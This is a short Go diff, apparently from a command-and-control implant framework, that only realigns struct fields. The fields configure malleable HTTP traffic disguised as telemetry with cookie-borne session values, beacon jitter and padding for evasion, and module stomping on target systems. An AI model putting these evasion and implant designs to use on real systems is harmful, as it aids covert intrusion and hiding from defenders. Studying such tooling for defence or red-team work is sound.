@@ -74,14 +74,14 @@ type C2Routing struct {
 
 // MalleableHTTPConfig defines how the plain_http transport disguises itself
 type MalleableHTTPConfig struct {
-	C2Path        string            `cbor:"1,keyasint"`        // e.g. "/api/v1/telemetry"
-	SessionHeader string            `cbor:"2,keyasint"`        // e.g. "Cookie"
-	SessionValue  string            `cbor:"3,keyasint"`        // e.g. "session=%s"
-	InitHeader    string            `cbor:"4,keyasint"`        // e.g. "Cookie"
-	InitValue     string            `cbor:"5,keyasint"`        // e.g. "init=1"
-	CloseHeader   string            `cbor:"6,keyasint"`        // e.g. "Cookie"
-	CloseValue    string            `cbor:"7,keyasint"`        // e.g. "teardown=1"
-	CustomHeaders map[string]string `cbor:"8,keyasint"`        // Static headers like User-Agent
+	C2Path        string            `cbor:"1,keyasint"` // e.g. "/api/v1/telemetry"
+	SessionHeader string            `cbor:"2,keyasint"` // e.g. "Cookie"
+	SessionValue  string            `cbor:"3,keyasint"` // e.g. "session=%s"
+	InitHeader    string            `cbor:"4,keyasint"` // e.g. "Cookie"
+	InitValue     string            `cbor:"5,keyasint"` // e.g. "init=1"
+	CloseHeader   string            `cbor:"6,keyasint"` // e.g. "Cookie"
+	CloseValue    string            `cbor:"7,keyasint"` // e.g. "teardown=1"
+	CustomHeaders map[string]string `cbor:"8,keyasint"` // Static headers like User-Agent
 }
 
 // Config build.json config file
@@ -125,9 +125,9 @@ type Config struct {
 	CCTimeout    int    `cbor:"35,keyasint"` // wait until this amount of milliseconds to re-connect to C2
 
 	// Payload-length malleability (padding only — no HTTP path tuning needed)
-	PaddingMin int `cbor:"55,keyasint"` // min bytes of random padding per CBOR frame
-	PaddingMax int `cbor:"56,keyasint"` // max bytes of random padding per CBOR frame
-	Jitter     int `cbor:"57,keyasint"` // percent jitter added to check-in interval
+	PaddingMin   int `cbor:"55,keyasint"` // min bytes of random padding per CBOR frame
+	PaddingMax   int `cbor:"56,keyasint"` // max bytes of random padding per CBOR frame
+	Jitter       int `cbor:"57,keyasint"` // percent jitter added to check-in interval
 	PollInterval int `cbor:"61,keyasint"` // C2 Beacon interval (seconds)
 	// Module Stomping
 	ModulePath    string `cbor:"58,keyasint"` // Path to the module to stomp (overwrite) on the target system
